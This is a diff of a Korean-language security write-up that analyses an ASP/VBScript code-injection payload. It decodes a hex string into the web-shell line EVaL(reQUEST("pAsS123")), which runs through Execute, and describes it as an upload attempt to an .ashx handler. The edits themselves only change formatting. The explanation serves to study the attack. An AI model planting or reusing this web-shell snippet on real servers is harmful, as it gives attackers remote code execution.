@@ -1,7 +1,7 @@
 
 ## **📌 예시 코드 1: 서버 측 코드(injection) / 원격 코드 실행(RCE)**
 
-* 서버 사이드 스크립트(ASP/VBScript)를 주입해 그 스크립트 내부에서 `Eval(Request(...))` 형태로 사용자 제공 코드를 실행하게 함 <br> → **서버 측 스크립트 코드 실행(RCE / server-side code injection)**.
+서버 사이드 스크립트(ASP/VBScript)를 주입해 그 스크립트 내부에서 `Eval(Request(...))` 형태로 사용자 제공 코드를 실행하게 함 <br> → **서버 측 스크립트 코드 실행(RCE / server-side code injection)**.
   <br> → 기술적으로는 *code injection / remote code execution*이며, 결과적으로 공격자가 스크립트에서 OS 쉘을 호출하도록 코드를 작성하면 **OS 명령 실행도 가능**(command execution으로 이어질 수 있음).
 
 ```
@@ -14,7 +14,7 @@ HTTP POST(멀티파트 폼바디) 안에 포함된 것으로 보이며, ASP/VBSc
 멀티파트 바운더리와 `.ashx` 엔드포인트(ASP.NET 핸들러)에 업로드/전송하려는 시도입니다.
 
 
-
+<br> 
 
 ### 16진수 문자열 디코딩 
 
@@ -29,6 +29,8 @@ EVaL(reQUEST("pAsS123"))
 
 `CON(...)` 함수(아래에서 설명)는 hex를 문자열로 변환하여 `EVaL(reQUEST("pAsS123"))`라는 코드 문자열을 만들고, 그 결과를 `Execute(...)`로 실행한다.
 
+
+<br> 
 
 
 ### 코드 흐름(토큰 단위 해석)
